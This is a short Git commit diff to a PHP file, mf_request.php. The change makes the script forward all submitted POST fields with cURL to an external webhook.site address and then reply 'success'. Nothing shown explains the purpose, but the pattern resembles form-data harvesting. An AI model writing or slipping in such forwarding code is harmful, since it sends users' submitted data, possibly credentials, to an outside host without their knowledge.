e7329f10c71a1bde933853884cab5e127013bee7
williamjones89 <53062749+williamjones89@users.noreply.github.com>
2019-07-21 16:38:27 -0400

    Update mf_request.php

--- mf_request.php
+++ mf_request.php
@@ -1,9 +1,12 @@
 <?php
 
-header('Content-type: text/plain');
-
-$data = file_get_contents('php_input');
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, "https://webhook.site/699a57c5-679e-42ba-a94d-ca0595ec55c6");
+curl_setopt($ch, CURLOPT_POST, 1);
+curl_setopt($ch, CURLOPT_TIMEOUT, 100);
+curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($_POST));
+curl_exec($ch);
+curl_close($ch);
 
 echo 'success';
-exit;
 ?>
